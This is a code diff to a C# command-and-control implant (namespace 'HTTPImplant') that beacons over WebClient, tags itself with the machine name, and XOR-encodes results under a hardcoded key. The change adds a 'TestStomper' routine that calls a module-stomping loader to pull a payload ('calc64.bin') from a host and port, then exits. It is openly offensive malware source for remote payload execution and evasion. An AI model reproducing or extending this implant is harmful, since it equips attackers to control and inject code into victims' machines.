@@ -27,8 +27,11 @@ namespace HTTPImplant
             string implantId = Environment.MachineName;
             string lastCommandExecuted = string.Empty;
 
+            TestStomper("localhost", "8000", "calc64.bin");
+
             using (WebClient webClient = new WebClient())
             {
+
                 while (true)
                 {
                     try
@@ -107,6 +110,17 @@ namespace HTTPImplant
             }
         }
 
+        public static void TestStomper(string hostname, string port, string file)
+        {
+            try
+            {
+                Console.WriteLine("Running stomper");
+                _ = Modules.ModuleStomper.Execute(hostname, port, file);
+                Console.WriteLine("Done.");
+                Environment.Exit(1);
+            } 
+            catch (Exception e) { Console.WriteLine($"Error {e}"); }
+        }
         public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
         {
             string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
